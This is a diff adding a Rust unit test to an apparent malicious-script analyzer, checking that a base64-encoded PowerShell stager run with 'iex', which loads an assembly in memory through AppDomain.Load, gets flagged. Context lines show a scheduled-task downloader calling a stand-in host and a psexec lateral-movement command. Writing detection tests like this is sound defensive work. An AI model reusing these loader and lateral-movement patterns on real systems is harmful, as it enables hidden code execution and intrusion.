@@ -2067,6 +2067,27 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
     }
 
     #[test]
+    fn appdomain_inmem_assembly_load_detected_in_extracted_ps_payload() {
+        // Some PS loaders avoid `[Reflection.Assembly]::Load` and call the
+        // equivalent AppDomain loader after building a byte array.
+        let body = "$payload=[byte[]](77,90,0,0); [System.AppDomain]::CurrentDomain.Load($payload)";
+        use base64::Engine as _;
+        let enc = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
+        let script = format!(
+            "@echo off\r\npowershell -Command \"$y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{enc}')); iex $y\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::InMemoryAssemblyLoad { variant } if variant == "AppDomain.Load"
+            )),
+            "AppDomain InMemoryAssemblyLoad not detected: traits={:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn lateral_movement_anti_recovery_probe_enum_traits() {
         let script = b"@echo off\r\n\
             psexec \\\\target.example -u admin -p pass cmd\r\n\
